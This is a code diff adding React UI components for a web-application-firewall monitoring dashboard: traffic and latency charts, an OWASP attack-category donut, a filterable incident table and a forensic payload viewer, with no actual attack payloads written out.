+            h('span', { style: { fontSize: '10px', color: 'var(--text-muted)', fontFamily: 'var(--font-mono)' } }, '312 Wire Drops')
+          )
+        ),
+
+        // Card 6: AST Tokenizer Time
+        h('div', { className: 'sg-glass-card sg-kpi-card' },
+          h('div', { className: 'sg-kpi-header' },
+            h('span', { className: 'sg-kpi-kicker' }, 'Lexical AST Engine'),
+            h('span', { className: 'sg-kpi-badge' }, 'ZERO-COPY')
+          ),
+          h('div', { className: 'sg-kpi-value-wrap' },
+            h('span', { className: 'sg-kpi-num' }, '0.19'),
+            h('span', { className: 'sg-kpi-unit' }, 'ms inspect')
+          ),
+          h('div', { className: 'sg-kpi-footer' },
+            h('span', { className: 'sg-kpi-delta sg-delta-up-good' }, 'DFA: 0.31ms'),
+            h('span', { style: { fontSize: '10px', color: 'var(--text-muted)', fontFamily: 'var(--font-mono)' } }, 'Seal: 0.20ms')
+          )
+        )
+      ),
+
+      // 4. Dual-Series Velocity Chart & OWASP Attack Vector Donut (Row 1)
+      h('div', { className: 'sg-charts-row' },
+        // Traffic Velocity Dual-Series SVG Chart
+        h('div', { className: 'sg-glass-card sg-chart-card' },
+          h('div', { className: 'sg-chart-header' },
+            h('h3', { className: 'sg-chart-title' },
+              h(Icons.Activity, { size: 15, style: { color: 'var(--deep-indigo)' } }),
+              'Real-Time Traffic Velocity & Intercept Dual-Series'
+            ),
+            h('div', { className: 'sg-chart-legend' },
+              h('div', { className: 'sg-legend-item' },
+                h('span', { className: 'sg-legend-dot', style: { background: '#38BDF8' } }),
+                h('span', null, 'Total Ingress (req/s)')
+              ),
+              h('div', { className: 'sg-legend-item' },
+                h('span', { className: 'sg-legend-dot', style: { background: '#F85149' } }),
+                h('span', null, 'Intercepted Threats')
+              )
+            )
+          ),
+
+          // Interactive Chart Container
+          h(TrafficVelocitySvg, {
+            data: telemetry,
+            hoveredPoint: hoveredPoint,
+            onHover: setHoveredPoint
+          })
+        ),
+
+        // OWASP Attack Vector Donut Chart
+        h('div', { className: 'sg-glass-card sg-chart-card' },
+          h('div', { className: 'sg-chart-header' },
+            h('h3', { className: 'sg-chart-title' },
+              h(Icons.Shield, { size: 15, style: { color: 'var(--terracotta)' } }),
+              'OWASP Attack Vector Distribution'
+            )
+          ),
+          h('div', { className: 'sg-donut-wrap' },
+            h(OwaspDonutSvg, {
+              vectors: attackVectors,
+              hoveredSlice: hoveredSlice,
+              onHoverSlice: setHoveredSlice,
+              onSelectCategory: (cat) => setCategoryFilter(categoryFilter === cat ? 'ALL' : cat)
+            }),
+            h('div', { className: 'sg-donut-legend-grid' },
+              attackVectors.map((vec) =>
+                h('div', {
+                  key: vec.category,
+                  className: `sg-donut-legend-chip ${categoryFilter === vec.category ? 'active' : ''}`,
+                  onClick: () => setCategoryFilter(categoryFilter === vec.category ? 'ALL' : vec.category),
+                  title: `Click to filter incidents by ${vec.name}`
+                },
+                  h('div', { style: { display: 'flex', alignItems: 'center', gap: '6px' } },
+                    h('span', { className: 'sg-legend-dot', style: { background: vec.color } }),
+                    h('span', { style: { fontSize: '10px', fontWeight: '700', fontFamily: 'var(--font-mono)' } }, vec.category)
+                  ),
+                  h('span', { style: { fontSize: '10px', color: 'var(--text-muted)', fontFamily: 'var(--font-mono)' } }, `${vec.percent}%`)
+                )
+              )
+            )
+          )
+        )
+      ),
+
+      // 5. P99 Latency Gauge & Multi-Percentile Matrix (Row 2)
+      h('div', { className: 'sg-latency-grid' },
+        // Semi-Circular Radial Latency Gauge
+        h('div', { className: 'sg-glass-card sg-gauge-card' },
+          h('div', { style: { width: '100%', display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '8px' } },
+            h('h3', { className: 'sg-chart-title' },
+              h(Icons.Clock, { size: 15, style: { color: 'var(--deep-indigo)' } }),
+              'P99 Tail Latency Gauge'
+            ),
+            h('span', { className: 'badge badge-online', style: { fontSize: '8px' } }, 'SLA: <5.0ms')
+          ),
+          h(RadialLatencyGauge, { value: currentMetric.p99 }),
+          h('div', { style: { marginTop: '8px', fontSize: '10px', color: 'var(--text-muted)', fontFamily: 'var(--font-mono)' } },
+            'Zero-Bypass Target: 100% of requests analyzed under 5.0ms'
+          )
+        ),
+
+        // Multi-Percentile & Pipeline Breakdown
+        h('div', { className: 'sg-glass-card sg-percentiles-card' },
+          h('div', { style: { display: 'flex', justifyContent: 'space-between', alignItems: 'center' } },
+            h('h3', { className: 'sg-chart-title' },
+              h(Icons.Sliders, { size: 15, style: { color: 'var(--deep-indigo)' } }),
+              'Execution Latency Spectrum & Pipeline Timing'
+            ),
+            h('span', { style: { fontSize: '11px', color: 'var(--sage-green)', fontFamily: 'var(--font-mono)', fontWeight: '700' } },
+              '✓ Deterministic SLA Met'
+            )
+          ),
+
+          h('div', { className: 'sg-percentiles-matrix' },
+            h('div', { className: 'sg-percentile-box' },
+              h('div', { className: 'sg-percentile-kicker' }, 'P50 MEDIAN'),
+              h('div', { className: 'sg-percentile-val' }, '0.41 ms')
+            ),
+            h('div', { className: 'sg-percentile-box' },
+              h('div', { className: 'sg-percentile-kicker' }, 'P90 DECILE'),
+              h('div', { className: 'sg-percentile-val' }, '0.88 ms')
+            ),
+            h('div', { className: 'sg-percentile-box' },
+              h('div', { className: 'sg-percentile-kicker' }, 'P95 PEAK'),
+              h('div', { className: 'sg-percentile-val' }, '1.12 ms')
+            ),
+            h('div', { className: 'sg-percentile-box' },
+              h('div', { className: 'sg-percentile-kicker', style: { color: 'var(--deep-indigo)' } }, 'P99 TAIL'),
+              h('div', { className: 'sg-percentile-val', style: { color: 'var(--deep-indigo)' } }, `${currentMetric.p99} ms`)
+            )
+          ),
+
+          // Pipeline Timing Stack Bar
+          h('div', { className: 'sg-pipeline-timing-bar' },
+            h('div', { style: { display: 'flex', justifyContent: 'space-between', fontSize: '10px', fontFamily: 'var(--font-mono)', color: 'var(--text-muted)' } },
+              h('span', null, 'KERNEL PIPELINE BREAKDOWN (TOTAL: 0.78ms)'),
+              h('span', null, '100% In-Process Zero-Copy')
+            ),
+            h('div', { className: 'sg-pipeline-segments' },
+              h('div', { className: 'sg-pipeline-seg', style: { width: '24%', background: '#38BDF8' }, title: 'Wire Parsing: 0.19ms' }),
+              h('div', { className: 'sg-pipeline-seg', style: { width: '40%', background: '#F59E0B' }, title: 'AST Lexical Tokenizer: 0.31ms' }),
+              h('div', { className: 'sg-pipeline-seg', style: { width: '26%', background: '#A855F7' }, title: 'Ed25519 Cryptographic Origin Seal: 0.20ms' }),
+              h('div', { className: 'sg-pipeline-seg', style: { width: '10%', background: '#3FB950' }, title: 'BPF Rule Forwarding: 0.08ms' })
+            ),
+            h('div', { style: { display: 'flex', justifyContent: 'space-between', fontSize: '9px', fontFamily: 'var(--font-mono)', color: 'var(--text-muted)' } },
+              h('span', { style: { color: '#38BDF8' } }, '■ Wire 0.19ms'),
+              h('span', { style: { color: '#F59E0B' } }, '■ AST DFA 0.31ms'),
+              h('span', { style: { color: '#A855F7' } }, '■ Ed25519 Seal 0.20ms'),
+              h('span', { style: { color: '#3FB950' } }, '■ BPF Table 0.08ms')
+            )
+          )
+        )
+      ),
+
+      // 6. Interactive Threat Incident Feed & Copyable Payloads Table
+      h('div', { className: 'sg-glass-card sg-incident-feed-card' },
+        h('div', { className: 'sg-feed-toolbar' },
+          h('div', { style: { display: 'flex', alignItems: 'center', gap: '8px' } },
+            h('h3', { className: 'sg-chart-title' },
+              h(Icons.AlertTriangle, { size: 15, style: { color: 'var(--terracotta)' } }),
+              'Adversarial Threat Intercept Dossier'
+            ),
+            h('span', { className: 'badge', style: { fontSize: '9px', background: 'var(--sand-warm)' } },
+              `Showing ${filteredIncidents.length} of ${incidents.length}`
+            )
+          ),
+
+          h('div', { className: 'sg-feed-filters' },
+            // Search Input
+            h('input', {
+              type: 'text',
+              className: 'sg-feed-search',
+              placeholder: 'Search IP, route, rule, payload...',
+              value: searchQuery,
+              onChange: (e) => setSearchQuery(e.target.value)
+            }),
+
+            // Category Filter Pills
+            ['ALL', 'SQLi', 'XSS', 'RCE', 'SSRF', 'Auth', 'Bots'].map((cat) =>
+              h('button', {
+                key: cat,
+                className: `sg-filter-pill ${categoryFilter === cat ? 'active' : ''}`,
+                onClick: () => setCategoryFilter(cat)
+              }, cat)
+            ),
+
+            // Severity Filter Pills
+            ['ALL', 'CRITICAL', 'HIGH', 'MEDIUM'].map((sev) =>
+              h('button', {
+                key: sev,
+                className: `sg-filter-pill ${severityFilter === sev ? 'active' : ''}`,
+                onClick: () => setSeverityFilter(sev)
+              }, sev)
+            )
+          )
+        ),
+
+        // Incident Table
+        h('div', { className: 'sg-table-container' },
+          h('table', { className: 'sg-incident-table' },
+            h('thead', null,
+              h('tr', null,
+                h('th', null, 'Timestamp'),
+                h('th', null, 'Severity'),
+                h('th', null, 'Category'),
+                h('th', null, 'Triggered Rule'),
+                h('th', null, 'Target Route'),
+                h('th', null, 'Client IP & Geo'),
+                h('th', null, 'Intercepted Payload Preview'),
+                h('th', { style: { textAlign: 'right' } }, 'Actions')
+              )
+            ),
+            h('tbody', null,
+              filteredIncidents.length === 0
+                ? h('tr', null,
+                    h('td', { colSpan: 8, style: { textAlign: 'center', padding: '24px', color: 'var(--text-muted)' } },
+                      'No threat incidents matching active filter criteria.'
+                    )
+                  )
+                : filteredIncidents.map((inc) =>
+                    h('tr', { key: inc.id },
+                      h('td', { style: { fontFamily: 'var(--font-mono)' } }, inc.timestamp),
+                      h('td', null,
+                        h('span', {
+                          className: `badge ${inc.severity === 'CRITICAL' ? 'badge-offline' : (inc.severity === 'HIGH' ? 'badge-challenging' : 'badge-online')}`,
+                          style: { fontSize: '9px' }
+                        }, inc.severity)
+                      ),
+                      h('td', { style: { fontFamily: 'var(--font-mono)', fontWeight: '700' } }, inc.category),
+                      h('td', { style: { fontFamily: 'var(--font-mono)', fontSize: '10px', color: 'var(--text-muted)' } }, inc.rule),
+                      h('td', null,
+                        h('code', { style: { fontSize: '10.5px' } }, inc.route)
+                      ),
+                      h('td', null,
+                        h('div', { style: { fontFamily: 'var(--font-mono)', fontSize: '10.5px' } }, inc.clientIp),
+                        h('div', { style: { fontSize: '9px', color: 'var(--text-muted)' } }, inc.geo)
+                      ),
+                      h('td', null,
+                        h('span', { className: 'sg-payload-cell', title: inc.payload }, inc.payload)
+                      ),
+                      h('td', { style: { textAlign: 'right', whiteSpace: 'nowrap' } },
+                        // Copy Payload Button with Tactile Feedback
+                        h('button', {
+                          className: `sg-copy-btn ${copiedId === inc.id ? 'copied' : ''}`,
+                          onClick: () => handleCopyPayload(inc.id, inc.payload),
+                          title: 'Copy Raw Attack Payload to Clipboard'
+                        },
+                          copiedId === inc.id ? h(Icons.Check, { size: 12 }) : h(Icons.Copy, { size: 12 }),
+                          copiedId === inc.id ? 'COPIED ✓' : 'Copy'
+                        ),
+
+                        // Inspect Forensics Button
+                        h('button', {
+                          className: 'btn btn-subtle',
+                          style: { padding: '4px 8px', fontSize: '10px', marginLeft: '6px', fontFamily: 'var(--font-mono)' },
+                          onClick: () => setSelectedIncident(inc),
+                          title: 'Open Detailed Forensic Incident Dossier'
+                        }, 'Inspect')
+                      )
+                    )
+                  )
+            )
+          )
+        )
+      ),
+
+      // 7. Forensic Payload Modal Overlay
+      selectedIncident && h(ForensicPayloadModal, {
+        incident: selectedIncident,
+        onClose: () => setSelectedIncident(null),
+        onCopy: handleCopyPayload,
+        isCopied: copiedId === selectedIncident.id
+      })
+    );
+  }
+
+  // ===========================================================================
+  // SUB-COMPONENT: TRAFFIC VELOCITY DUAL-SERIES SVG CHART
+  // ===========================================================================
+  function TrafficVelocitySvg({ data, hoveredPoint, onHover }) {
+    if (!data || data.length < 2) return null;
+
+    const svgWidth = 800;
+    const svgHeight = 230;
+    const padding = { top: 20, right: 30, bottom: 30, left: 55 };
+
+    const chartW = svgWidth - padding.left - padding.right;
+    const chartH = svgHeight - padding.top - padding.bottom;
+
+    const maxReq = Math.max(...data.map(d => d.requests), 20000) * 1.15;
+    const maxThreat = Math.max(...data.map(d => d.threats), 3000) * 1.3;
+
+    // Generate Points Coordinates
+    const reqPoints = data.map((d, i) => {
+      const x = padding.left + (i / (data.length - 1)) * chartW;
+      const y = padding.top + chartH - (d.requests / maxReq) * chartH;
+      return { x, y, data: d };
+    });
+
+    const threatPoints = data.map((d, i) => {
+      const x = padding.left + (i / (data.length - 1)) * chartW;
+      const y = padding.top + chartH - (d.threats / maxThreat) * chartH;
+      return { x, y, data: d };
+    });
+
+    // Cubic Bezier Path Generator
+    function makeBezierPath(points) {
+      if (points.length < 2) return '';
+      let path = `M ${points[0].x},${points[0].y}`;
+      for (let i = 0; i < points.length - 1; i++) {
+        const p0 = points[i];
+        const p1 = points[i + 1];
+        const cx = (p0.x + p1.x) / 2;
+        path += ` C ${cx},${p0.y} ${cx},${p1.y} ${p1.x},${p1.y}`;
+      }
+      return path;
+    }
+
+    const reqPath = makeBezierPath(reqPoints);
+    const reqArea = `${reqPath} L ${padding.left + chartW},${padding.top + chartH} L ${padding.left},${padding.top + chartH} Z`;
+
+    const threatPath = makeBezierPath(threatPoints);
+    const threatArea = `${threatPath} L ${padding.left + chartW},${padding.top + chartH} L ${padding.left},${padding.top + chartH} Z`;
+
+    // Horizontal Y Gridlines
+    const yGridTicks = [0, 0.25, 0.5, 0.75, 1.0];
+
+    return h('div', { className: 'sg-velocity-chart-wrap' },
+      h('svg', {
+        className: 'sg-velocity-svg',
+        viewBox: `0 0 ${svgWidth} ${svgHeight}`,
+        preserveAspectRatio: 'none',
+        onMouseMove: (e) => {
+          const rect = e.currentTarget.getBoundingClientRect();
+          const mouseX = e.clientX - rect.left;
+          const relativeX = (mouseX / rect.width) * svgWidth;
+          if (relativeX < padding.left || relativeX > padding.left + chartW) return;
+          const idx = Math.round(((relativeX - padding.left) / chartW) * (data.length - 1));
+          if (data[idx]) {
+            onHover({
+              x: reqPoints[idx].x,
+              reqY: reqPoints[idx].y,
+              threatY: threatPoints[idx].y,
+              point: data[idx]
+            });
+          }
+        },
+        onMouseLeave: () => onHover(null)
+      },
+        // Gradients
+        h('defs', null,
+          h('linearGradient', { id: 'reqGrad', x1: '0', y1: '0', x2: '0', y2: '1' },
+            h('stop', { offset: '0%', stopColor: '#38BDF8', stopOpacity: 0.35 }),
+            h('stop', { offset: '100%', stopColor: '#38BDF8', stopOpacity: 0.02 })
+          ),
+          h('linearGradient', { id: 'threatGrad', x1: '0', y1: '0', x2: '0', y2: '1' },
+            h('stop', { offset: '0%', stopColor: '#F85149', stopOpacity: 0.4 }),
+            h('stop', { offset: '100%', stopColor: '#F85149', stopOpacity: 0.02 })
+          )
+        ),
+
+        // Y Gridlines
+        yGridTicks.map((tick, i) => {
+          const y = padding.top + chartH - tick * chartH;
+          const valLabel = Math.round((tick * maxReq) / 1000) + 'k';
+          return h('g', { key: i },
+            h('line', {
+              x1: padding.left,
+              y1: y,
+              x2: padding.left + chartW,
+              y2: y,
+              stroke: 'rgba(255, 255, 255, 0.06)',
+              strokeDasharray: '4,4'
+            }),
+            h('text', {
+              x: padding.left - 10,
+              y: y + 4,
+              fill: 'var(--text-muted)',
+              fontSize: '10',
+              fontFamily: 'var(--font-mono)',
+              textAnchor: 'end'
+            }, valLabel)
+          );
+        }),
+
+        // X Axis Ticks
+        [0, Math.floor(data.length / 4), Math.floor(data.length / 2), Math.floor((data.length * 3) / 4), data.length - 1].map((idx) => {
+          const pt = reqPoints[idx];
+          if (!pt) return null;
+          return h('text', {
+            key: idx,
+            x: pt.x,
+            y: svgHeight - 8,
+            fill: 'var(--text-muted)',
+            fontSize: '10',
+            fontFamily: 'var(--font-mono)',
+            textAnchor: 'middle'
+          }, pt.data.time);
+        }),
+
+        // Area Fills
+        h('path', { d: reqArea, fill: 'url(#reqGrad)' }),
+        h('path', { d: threatArea, fill: 'url(#threatGrad)' }),
+
+        // Stroke Lines
+        h('path', { d: reqPath, fill: 'none', stroke: '#38BDF8', strokeWidth: '2.5', strokeLinecap: 'round' }),
+        h('path', { d: threatPath, fill: 'none', stroke: '#F85149', strokeWidth: '2', strokeLinecap: 'round' }),
+
+        // Interactive Scrubber Guide Line & Dots
+        hoveredPoint && h('g', null,
+          h('line', {
+            x1: hoveredPoint.x,
+            y1: padding.top,
+            x2: hoveredPoint.x,
+            y2: padding.top + chartH,
+            stroke: 'var(--deep-indigo)',
+            strokeWidth: '1.5',
+            strokeDasharray: '3,3'
+          }),
+          h('circle', {
+            cx: hoveredPoint.x,
+            cy: hoveredPoint.reqY,
+            r: '5',
+            fill: '#38BDF8',
+            stroke: '#FFFFFF',
+            strokeWidth: '2'
+          }),
+          h('circle', {
+            cx: hoveredPoint.x,
+            cy: hoveredPoint.threatY,
+            r: '5',
+            fill: '#F85149',
+            stroke: '#FFFFFF',
+            strokeWidth: '2'
+          })
+        )
+      ),
+
+      // Floating HUD Tooltip Card
+      hoveredPoint && h('div', {
+        className: 'sg-chart-hud-tooltip',
+        style: {
+          left: `${(hoveredPoint.x / svgWidth) * 100}%`,
+          top: `${(hoveredPoint.reqY / svgHeight) * 100}%`
+        }
+      },
+        h('div', { style: { fontWeight: '800', color: 'var(--text-charcoal)', marginBottom: '3px' } },
+          `SNAPSHOT: ${hoveredPoint.point.time}`
+        ),
+        h('div', { style: { color: '#38BDF8' } },
+          `Ingress: ${hoveredPoint.point.requests.toLocaleString()} req/s`
+        ),
+        h('div', { style: { color: '#F85149' } },
+          `Threats: ${hoveredPoint.point.threats.toLocaleString()} blocks/s`
+        ),
+        h('div', { style: { color: 'var(--sage-green)', marginTop: '2px' } },
+          `P99 Latency: ${hoveredPoint.point.p99} ms`
+        )
+      )
+    );
+  }
+
+  // ===========================================================================
+  // SUB-COMPONENT: OWASP ATTACK VECTOR DONUT SVG
+  // ===========================================================================
+  function OwaspDonutSvg({ vectors, hoveredSlice, onHoverSlice, onSelectCategory }) {
+    const size = 170;
+    const center = size / 2;
+    const radius = 62;
+    const strokeWidth = 20;
+
+    let cumulativePercent = 0;
+    const totalCount = vectors.reduce((acc, v) => acc + v.count, 0);
+
+    const slices = vectors.map((v) => {
+      const startAngle = cumulativePercent * 3.6;
+      cumulativePercent += v.percent;
+      const endAngle = cumulativePercent * 3.6;
+
+      const startRad = (startAngle - 90) * (Math.PI / 180);
+      const endRad = (endAngle - 90) * (Math.PI / 180);
+
+      const x1 = center + radius * Math.cos(startRad);
+      const y1 = center + radius * Math.sin(startRad);
+      const x2 = center + radius * Math.cos(endRad);
+      const y2 = center + radius * Math.sin(endRad);
+
+      const largeArc = v.percent > 50 ? 1 : 0;
+      const pathData = `M ${x1} ${y1} A ${radius} ${radius} 0 ${largeArc} 1 ${x2} ${y2}`;
+
+      return {
+        ...v,
+        pathData,
+        isHovered: hoveredSlice === v.category
+      };
+    });
+
+    return h('div', { className: 'sg-donut-svg-container' },
+      h('svg', { width: size, height: size, viewBox: `0 0 ${size} ${size}` },
+        // Background Ring
+        h('circle', {
+          cx: center,
+          cy: center,
+          r: radius,
+          fill: 'none',
+          stroke: 'rgba(255, 255, 255, 0.05)',
+          strokeWidth: strokeWidth
+        }),
+
+        // Segment Arcs
+        slices.map((slice) =>
+          h('path', {
+            key: slice.category,
+            d: slice.pathData,
+            fill: 'none',
+            stroke: slice.color,
+            strokeWidth: slice.isHovered ? strokeWidth + 4 : strokeWidth,
+            strokeLinecap: 'butt',
+            style: {
+              cursor: 'pointer',
+              transition: 'all 0.2s ease',
+              filter: slice.isHovered ? `drop-shadow(0 0 6px ${slice.color})` : 'none'
+            },
+            onMouseEnter: () => onHoverSlice(slice.category),
+            onMouseLeave: () => onHoverSlice(null),
+            onClick: () => onSelectCategory(slice.category)
+          })
+        )
+      ),
+
+      // Center Readout
+      h('div', { className: 'sg-donut-center-text' },
+        h('div', { className: 'sg-donut-center-num' },
+          hoveredSlice ? `${vectors.find(v => v.category === hoveredSlice)?.percent}%` : totalCount.toLocaleString()
+        ),
+        h('div', { className: 'sg-donut-center-lbl' },
+          hoveredSlice ? hoveredSlice : 'TOTAL ATTACKS'
+        )
+      )
+    );
+  }
+
+  // ===========================================================================
+  // SUB-COMPONENT: RADIAL LATENCY GAUGE
+  // ===========================================================================
+  function RadialLatencyGauge({ value }) {
+    const width = 200;
+    const height = 120;
+    const cx = 100;
+    const cy = 105;
+    const r = 74;
+    const strokeWidth = 14;
+
+    // Scale 0.0ms to 6.0ms (SLA guarantee is 5.0ms)
+    const maxVal = 6.0;
+    const normalized = Math.min(Math.max(value / maxVal, 0), 1);
+
+    // Arc angles from 180deg (left) to 0deg (right)
+    const angle = Math.PI - normalized * Math.PI;
+    const needleX = cx + r * Math.cos(angle);
+    const needleY = cy - r * Math.sin(angle);
+
+    // Track arc from (-r, 0) to (r, 0)
+    const trackPath = `M ${cx - r} ${cy} A ${r} ${r} 0 0 1 ${cx + r} ${cy}`;
+
+    // Fill arc
+    const fillPath = `M ${cx - r} ${cy} A ${r} ${r} 0 0 1 ${needleX} ${needleY}`;
+
+    // Gauge color dynamic gradient
+    const gaugeColor = value <= 2.0 ? '#3FB950' : (value <= 4.5 ? '#F59E0B' : '#F85149');
+
+    return h('div', { className: 'sg-gauge-svg-wrap' },
+      h('svg', { width: width, height: height, viewBox: `0 0 ${width} ${height}` },
+        // Background Track
+        h('path', {
+          d: trackPath,
+          fill: 'none',
+          stroke: 'rgba(255, 255, 255, 0.08)',
+          strokeWidth: strokeWidth,
+          strokeLinecap: 'round'
+        }),
+
+        // Colored Active Arc
+        h('path', {
+          d: fillPath,
+          fill: 'none',
+          stroke: gaugeColor,
+          strokeWidth: strokeWidth,
+          strokeLinecap: 'round',
+          style: { transition: 'stroke 0.3s ease' }
+        }),
+
+        // 5.0ms SLA Threshold Tick
+        h('g', null,
+          h('circle', {
+            cx: cx + r * Math.cos(Math.PI - (5.0 / 6.0) * Math.PI),
+            cy: cy - r * Math.sin(Math.PI - (5.0 / 6.0) * Math.PI),
+            r: 3,
+            fill: '#F85149'
+          })
+        ),
+
+        // Glowing Needle Tip
+        h('circle', {
+          cx: needleX,
+          cy: needleY,
+          r: 6,
+          fill: '#FFFFFF',
+          stroke: gaugeColor,
+          strokeWidth: 2,
+          style: { filter: `drop-shadow(0 0 6px ${gaugeColor})`, transition: 'all 0.3s ease' }
+        })
+      ),
+
+      // Center Digital Readout
+      h('div', { className: 'sg-gauge-digital-readout' },
+        h('div', { className: 'sg-gauge-num' }, `${value.toFixed(2)} ms`),
+        h('div', { className: 'sg-gauge-lbl' }, 'P99 Real-Time Latency')
+      )
+    );
+  }
+
+  // ===========================================================================
+  // SUB-COMPONENT: FORENSIC PAYLOAD MODAL
+  // ===========================================================================
+  function ForensicPayloadModal({ incident, onClose, onCopy, isCopied }) {
+    if (!incident) return null;
+
+    return h('div', { className: 'sg-forensic-modal-overlay', onClick: onClose },
+      h('div', { className: 'sg-glass-card sg-forensic-modal-card', onClick: (e) => e.stopPropagation() },
+        // Modal Header
+        h('div', { style: { display: 'flex', justifyContent: 'space-between', alignItems: 'center', borderBottom: '1px solid var(--stone-border)', paddingBottom: '14px', marginBottom: '16px' } },
+          h('div', null,
+            h('div', { style: { fontSize: '11px', fontFamily: 'var(--font-mono)', color: 'var(--text-muted)' } },
+              `INCIDENT FORENSIC DOSSIER // ${incident.id}`
+            ),
+            h('h3', { style: { margin: '4px 0 0 0', fontSize: '16px', fontWeight: '800', color: 'var(--text-charcoal)' } },
+              `${incident.category}: ${incident.rule}`
+            )
+          ),
+          h('button', {
+            className: 'btn btn-subtle',
+            style: { padding: '4px 8px' },
+            onClick: onClose,
+            'aria-label': 'Close modal'
+          }, h(Icons.Close, { size: 16 }))
+        ),
+
+        // Metadata Grid
+        h('div', { style: { display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(180px, 1fr))', gap: '10px', marginBottom: '16px' } },
+          h('div', { style: { background: 'var(--sand-warm)', padding: '10px', borderRadius: 'var(--radius-xs)' } },
+            h('div', { style: { fontSize: '9px', fontFamily: 'var(--font-mono)', color: 'var(--text-muted)' } }, 'ATTACK TIME'),
+            h('div', { style: { fontSize: '12px', fontWeight: '700', fontFamily: 'var(--font-mono)' } }, incident.timestamp)
+          ),
+          h('div', { style: { background: 'var(--sand-warm)', padding: '10px', borderRadius: 'var(--radius-xs)' } },
+            h('div', { style: { fontSize: '9px', fontFamily: 'var(--font-mono)', color: 'var(--text-muted)' } }, 'ADVERSARY IP & GEO'),
+            h('div', { style: { fontSize: '12px', fontWeight: '700', fontFamily: 'var(--font-mono)' } }, `${incident.clientIp} (${incident.geo})`)
+          ),
+          h('div', { style: { background: 'var(--sand-warm)', padding: '10px', borderRadius: 'var(--radius-xs)' } },
+            h('div', { style: { fontSize: '9px', fontFamily: 'var(--font-mono)', color: 'var(--text-muted)' } }, 'RISK CLASSIFICATION'),
+            h('div', { style: { fontSize: '12px', fontWeight: '800', color: 'var(--terracotta)', fontFamily: 'var(--font-mono)' } },
+              `${incident.riskScore}/100 (${incident.severity})`
+            )
+          ),
+          h('div', { style: { background: 'var(--sand-warm)', padding: '10px', borderRadius: 'var(--radius-xs)' } },
+            h('div', { style: { fontSize: '9px', fontFamily: 'var(--font-mono)', color: 'var(--text-muted)' } }, 'VERDICT'),
+            h('div', { style: { fontSize: '11px', fontWeight: '700', color: 'var(--terracotta)', fontFamily: 'var(--font-mono)' } }, incident.verdict)
+          )
+        ),
+
+        // Decoded Malicious Payload
+        h('div', { style: { marginBottom: '16px' } },
+          h('div', { style: { display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '6px' } },
+            h('span', { style: { fontSize: '11px', fontWeight: '800', fontFamily: 'var(--font-mono)', color: 'var(--text-muted)' } },
+              'INTERCEPTED PAYLOAD (RAW WIRE WIRE-TAP):'
+            ),
+            h('button', {
+              className: `sg-copy-btn ${isCopied ? 'copied' : ''}`,
+              onClick: () => onCopy(incident.id, incident.payload)
+            },
+              isCopied ? h(Icons.Check, { size: 12 }) : h(Icons.Copy, { size: 12 }),
+              isCopied ? 'COPIED ✓' : 'Copy Payload'
+            )
+          ),
+          h('pre', {
+            style: {
+              background: 'rgba(0, 0, 0, 0.45)',
+              border: '1px solid var(--stone-border)',
+              borderRadius: 'var(--radius-sm)',
+              padding: '12px',
+              fontFamily: 'var(--font-mono)',
+              fontSize: '11.5px',
+              color: 'var(--warm-ochre)',
+              whiteSpace: 'pre-wrap',
+              wordBreak: 'break-all',
+              margin: 0
+            }
+          }, incident.payload)
+        ),
+
+        // AST Lexical Tokens
+        h('div', { style: { marginBottom: '16px' } },
+          h('span', { style: { fontSize: '11px', fontWeight: '800', fontFamily: 'var(--font-mono)', color: 'var(--text-muted)' } },
+            'PARSED AST LEXICAL TOKENS (ZERO-BYPASS DFA MATCH):'
+          ),
+          h('div', { className: 'sg-token-grid' },
+            incident.astTokens.map((tok, i) =>
+              h('span', { key: i, className: 'sg-token-chip' }, tok)
+            )
+          )
+        ),
+
+        // Origin Cryptographic Ed25519 Seal
+        h('div', { style: { background: 'var(--sand-warm)', padding: '10px 14px', borderRadius: 'var(--radius-sm)', border: '1px solid var(--stone-border)', marginBottom: '18px' } },
+          h('div', { style: { fontSize: '9px', fontFamily: 'var(--font-mono)', color: 'var(--text-muted)' } },
+            'CRYPTOGRAPHIC ORIGIN SEAL (RFC 8032 ED25519 SIGNATURE)'
+          ),
+          h('div', { style: { fontSize: '11px', fontFamily: 'var(--font-mono)', color: 'var(--deep-indigo)', wordBreak: 'break-all', marginTop: '3px' } },
+            incident.seal
+          )
+        ),
+
+        // Modal Action Footer
+        h('div', { style: { display: 'flex', justifyContent: 'flex-end', gap: '10px' } },
+          h('button', {
+            className: 'btn btn-subtle',
+            onClick: onClose
+          }, 'Close Dossier')
+        )
+      )
+    );
+  }
+
+  // ===========================================================================
+  // ROOT MOUNT ENGINE (React 18 createRoot with graceful fallback)
+  // ===========================================================================
+  let reactRootInstance = null;
+
+  window.initReactAnalytics = function () {
+    const container = document.getElementById('react-analytics-root');
+    if (!container) return;
+
+    if (window.ReactDOM && window.ReactDOM.createRoot) {
+      if (!reactRootInstance) {
+        reactRootInstance = window.ReactDOM.createRoot(container);
+      }
+      reactRootInstance.render(h(ModernAnalyticsDashboard));
+    } else if (window.ReactDOM && window.ReactDOM.render) {
+      window.ReactDOM.render(h(ModernAnalyticsDashboard), container);
+    } else {
+      console.warn('[SentinelGrid React] React / ReactDOM 18 not yet loaded. Retrying...');
+      setTimeout(window.initReactAnalytics, 200);
+    }
+  };
+
+  // Auto-mount if document is already ready and section is visible
+  if (document.readyState === 'complete' || document.readyState === 'interactive') {
+    setTimeout(window.initReactAnalytics, 50);
+  } else {
+    document.addEventListener('DOMContentLoaded', () => setTimeout(window.initReactAnalytics, 50));
+  }
+
+})();
